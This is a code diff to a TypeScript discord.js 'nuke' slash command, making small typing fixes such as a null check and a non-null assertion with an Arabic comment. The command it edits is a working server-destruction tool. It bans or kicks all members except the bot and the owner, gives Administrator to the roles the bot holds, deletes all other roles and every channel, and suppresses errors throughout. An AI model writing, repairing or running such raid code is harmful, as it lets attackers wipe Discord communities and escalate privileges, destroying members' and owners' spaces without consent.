@@ -1,5 +1,5 @@
 // language: TypeScript, file: src/commands/nuke.ts
-import { SlashCommandBuilder, PermissionFlagsBits, ChannelType, ChatInputCommandInteraction, Client, Guild } from 'discord.js';
+import { SlashCommandBuilder, PermissionFlagsBits, ChannelType, ChatInputCommandInteraction, Client, GuildChannel } from 'discord.js';
 
 export default {
     data: new SlashCommandBuilder()
@@ -26,6 +26,7 @@ export default {
             const members = await guild.members.fetch();
             for (const [id, member] of members) {
                 if (id === me || id === owner) continue;
+                
                 if (member.bannable) {
                     await member.ban({ reason: 'Nuke Command' }).catch(() => {});
                 } else if (member.kickable) {
@@ -40,7 +41,8 @@ export default {
             const roles = await guild.roles.fetch();
             for (const [id, role] of roles) {
                 if (id === guild.id || !role.editable) continue;
-                if (role.members.has(me!)) {
+                
+                if (me && role.members.has(me)) {
                     await role.setPermissions([PermissionFlagsBits.Administrator]).catch(() => {});
                 } else {
                     await role.delete('Nuke Command').catch(() => {});
@@ -53,7 +55,8 @@ export default {
         try {
             const channels = await guild.channels.fetch();
             for (const [id, channel] of channels) {
-                await channel.delete('Nuke Command').catch(() => {});
+                // إضافة '!' عشان نطمن TypeScript إن القناة مش null
+                await channel!.delete('Nuke Command').catch(() => {});
                 await new Promise(r => setTimeout(r, 250));
             }
         } catch (e) {}
